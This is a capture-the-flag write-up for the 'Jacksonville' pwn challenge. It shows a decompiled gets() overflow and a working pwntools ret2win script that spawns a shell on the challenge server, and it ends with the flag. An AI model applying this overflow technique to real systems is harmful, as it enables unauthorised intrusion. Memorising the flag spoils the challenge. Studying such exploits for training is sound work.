# Jacksonville

```
The Jacksonville Jaguars are having a rough season, let's cheer them on!!

    jacksonville

nc chal.sunshinectf.games 25602 
```

Decompile in IDA:

```c
int vuln()
{
  int result; // eax
  _QWORD v1[12]; // [rsp+0h] [rbp-60h] BYREF

  memset(v1, 0, 89);
  printf("What's the best Florida football team?\n> ");
  gets(v1);
  result = strcmp((const char *)v1 + 6, "Jaguars");
  if ( result )
  {
    puts("WRONG ANSWER!!");
    exit(1);
  }
  return result;
}
int win()
{
  return system("/bin/sh");
}
```

Although there is a `strcmp` check, we can insert `NUL` characters within the middle for `gets`. So we can employ the ROP attack while satisfying the check:

```python
from pwn import *

elf = ELF("./jacksonville")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

p = remote("chal.sunshinectf.games", 25602)
# p = process(["./jacksonville"])
# gdb.attach(p)
# pause()
p.recvuntil(b"> ")
ret_gadget = 0x40101A # ensure stack is aligned
p.sendline(
    b"A" * 6 + b"Jaguars\0" + b"A" * 90 + p64(ret_gadget) + p64(elf.symbols["win"])
)
p.interactive()
```

Flag: `sun{It4chI_b3ats_0b!to_nO_d!ff}`.